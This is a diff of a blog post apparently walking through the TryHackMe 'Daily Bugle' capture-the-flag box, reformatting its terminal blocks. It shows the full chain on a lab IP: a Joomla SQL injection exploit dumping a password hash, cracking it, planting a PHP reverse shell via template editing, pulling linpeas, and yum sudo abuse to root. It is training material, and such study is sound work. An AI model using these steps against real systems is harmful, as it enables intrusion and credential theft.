@@ -26,8 +26,7 @@ Welcome to the Daily Bugle.  We will get the scoop on Spidey.
 
 Run nmap to get a list of the services running.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.167.104
 [sudo] password for kali: 
@@ -62,14 +61,13 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 37.15 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run the vuln category of nmap scripts hoping to find low-hanging fruit...and a vulnerability we can exploit.
 
-{% raw %}
-```bash
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ sudo nmap --script vuln -oN vulnchk 10.10.167.104
 [sudo] password for kali: 
@@ -97,8 +95,8 @@ PORT     STATE SERVICE
 |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Check the Landing Page of the website.
@@ -122,8 +120,7 @@ Look for a script to exploit the SQL injection exploit listed in the nmap vulner
 <br />
 Download the exploit to our local working folder.
 
-{% raw %}
-```bash
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/refs/heads/master/joomblah.py
 --2025-02-19 00:11:58--  https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/refs/heads/master/joomblah.py
@@ -136,14 +133,13 @@ Saving to: ‘joomblah.py’
 joomblah.py                                                100%[========================================================================================================================================>]   5.90K  --.-KB/s    in 0.002s  
 
 2025-02-19 00:11:59 (3.75 MB/s) - ‘joomblah.py’ saved [6040/6040]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Run the python script to dump the users table.
 
-{% raw %}
-```bash
+{% capture runsqliexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ python joomblah.py http://10.10.167.104
 /home/kali/Documents/thm/bugle/joomblah.py:160: SyntaxWarning: invalid escape sequence '\ '
@@ -169,14 +165,13 @@ Run the python script to dump the users table.
   -  Extracting users from fb9j5_users
  [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
   -  Extracting sessions from fb9j5_session
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runsqliexploit %}
 
 <br />
 Create a file containing the hash so we can pass it to john the ripper.
 
-{% raw %}
-```bash
+{% capture crackjohn %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt                 
 Using default input encoding: UTF-8
@@ -188,8 +183,8 @@ spiderman123     (jonah)
 1g 0:00:05:44 DONE (2025-02-19 00:38) 0.002902g/s 135.9p/s 135.9c/s 135.9C/s thelma1..speciala
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=crackjohn %}
 
 <br />
 Authenticate into the /administrator/ section with the creds we just extracted.
@@ -203,15 +198,14 @@ Authenticate into the /administrator/ section with the creds we just extracted.
 <br />
 Try to SSH with the credentials, maybe we will get lucky.  Nope!
 
-{% raw %}
-```bash
+{% capture trysshjames %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ ssh james@10.10.167.104                       
 james@10.10.167.104's password: 
 Permission denied, please try again.
 james@10.10.167.104's password:
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=trysshjames %}
 
 <br />
 Perform more research about the vulnerabilities associated with Joomla.  Apperently, we can abuse the template section.  So from the Extensions menu, rollover Templates, and Select Templates.
@@ -225,8 +219,7 @@ Perform more research about the vulnerabilities associated with Joomla.  Apperen
 <br />
 Download Pentest Monkey's PHP reverse shell.
 
-{% raw %}
-```bash
+{% capture downloadshellphp %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
 --2025-02-19 00:54:47--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -239,16 +232,24 @@ Saving to: ‘shell.php’
 shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0.003s  
 
 2025-02-19 00:54:47 (1.76 MB/s) - ‘shell.php’ saved [5491/5491]
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadshellphp %}
+
+{% raw %}
+```bash
+
 ```
 {% endraw %}
 
 <br />
 Update the IP and port in the script to whatever you are going to use as your lhost and lport.
 
-{% raw %}
-```php
+{% capture catshellphp %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
-└─$ cat shell.php               
+└─$ cat shell.php
+{% endcapture %}
+
+{% capture shellphp %}
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -273,8 +274,12 @@ $daemon = 0;
 $debug = 0;
 
 <snip>
-```
-{% endraw %}
+
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catshellphp %}
+
+{% include terminal.html language='php' title='shell.php' content=shellphp %}
 
 <br />
 Click on the New File button.
@@ -343,8 +348,7 @@ Paste the exploit one-line into the cmd paramter end execute.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
@@ -353,14 +357,13 @@ id
 uid=48(apache) gid=48(apache) groups=48(apache)
 python -c 'import pty; pty.spawn("/bin/bash");'
 bash-4.2$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Download linpeas.
 
-{% raw %}
-```bash
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
 --2025-02-19 01:16:25--  https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
@@ -383,14 +386,13 @@ linpeas.sh                                                 100%[================
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ python -m 'http.server'         
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
 Transfer linpeas.sh to the victim machine.
 
-{% raw %}
-```bash
+{% capture downloadlinpeas %}
 bash-4.2$ wget 10.4.119.29:8000/linpeas.sh
 wget 10.4.119.29:8000/linpeas.sh
 --2025-02-18 09:17:31--  http://10.4.119.29:8000/linpeas.sh
@@ -405,14 +407,13 @@ Saving to: 'linpeas.sh'
 
 bash-4.2$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadlinpeas %}
 
 <br />
 Run the linpeas.sh script.
 
-{% raw %}
-```bash
+{% capture runlinpeas %}
 bash-4.2$ ./linpeas.sh
 ./linpeas.sh
 
@@ -425,16 +426,18 @@ bash-4.2$ ./linpeas.sh
 /var/www/html/libraries/joomla/log/logger/database.php:                 'password' => $this->password,
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runlinpeas %}
 
 <br />
 From the results of the peas, there appears to be a juicy configuration file.
 
-{% raw %}
-```bash
+{% capture catconfig %}
 [jjameson@dailybugle beez3]$ cat /var/www/html/configuration.php
 cat /var/www/html/configuration.php
+{% endcapture %}
+
+{% capture configurationphp %}
 <?php
 class JConfig {
         public $offline = '0';
@@ -454,39 +457,40 @@ class JConfig {
         public $password = 'nv5uz9r3ZEDzVjNu';
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
 
+{% include terminal.html language='bash' title='bash' content=catconfig %}
+
+{% include terminal.html language='php' title='php' content=configurationphp %}
+
+<br />
 Use the password from the configuration file to su into the jjameson user.
 
-{% raw %}
-```bash
+{% capture sujjameson %}
 <bash-4.2$ su jjameson
 su jjameson
 Password: nv5uz9r3ZEDzVjNu
 
 [jjameson@dailybugle beez3]$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sujjameson %}
 
 <br />
 SSH into the machine just so we can get a better shell.
 
-{% raw %}
-```bash
+{% capture sshjjameson %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ ssh jjameson@10.10.167.104                  
 jjameson@10.10.167.104's password: 
 Last login: Tue Feb 18 09:26:04 2025
 [jjameson@dailybugle ~]$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshjjameson %}
 
 <br />
 Run sudo -l to get a list of commands that our user can run as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 ┌──(kali㉿kali)-[~/Documents/thm/bugle]
 └─$ ssh jjameson@10.10.167.104                  
 jjameson@10.10.167.104's password: 
@@ -499,8 +503,8 @@ Matching Defaults entries for jjameson on dailybugle:
 
 User jjameson may run the following commands on dailybugle:
     (ALL) NOPASSWD: /usr/bin/yum
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Check the GTFOBins for the yum.
@@ -514,8 +518,7 @@ Check the GTFOBins for the yum.
 <br />
 Follow the steps in the GTFO Bins to escalate to root.
 
-{% raw %}
-```bash
+{% capture gtfo %}
 [jjameson@dailybugle ~]$ TF=$(mktemp -d)
 [jjameson@dailybugle ~]$ cat >$TF/x<<EOF
 > [main]
@@ -540,14 +543,13 @@ Failed to set locale, defaulting to C
 Loaded plugins: y
 No plugin match for: y
 sh-4.2#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=gtfo %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 sh-4.2# cat /root/root.txt
 <redacted>
 sh-4.2# ip a
@@ -563,14 +565,13 @@ sh-4.2# ip a
        valid_lft 2222sec preferred_lft 2222sec
     inet6 fe80::17:f9ff:fee3:8c35/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture t_bash %}
 sh-4.2# cat /home/jjameson/user.txt
 <redacted>
 sh-4.2# ip a
@@ -586,5 +587,8 @@ sh-4.2# ip a
        valid_lft 2182sec preferred_lft 2182sec
     inet6 fe80::17:f9ff:fee3:8c35/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=t_bash %}
+
+<br />
+Hot off the presses!!  Another box down!  Hopefully, you enjoyed the read.  I will see you in the next one.
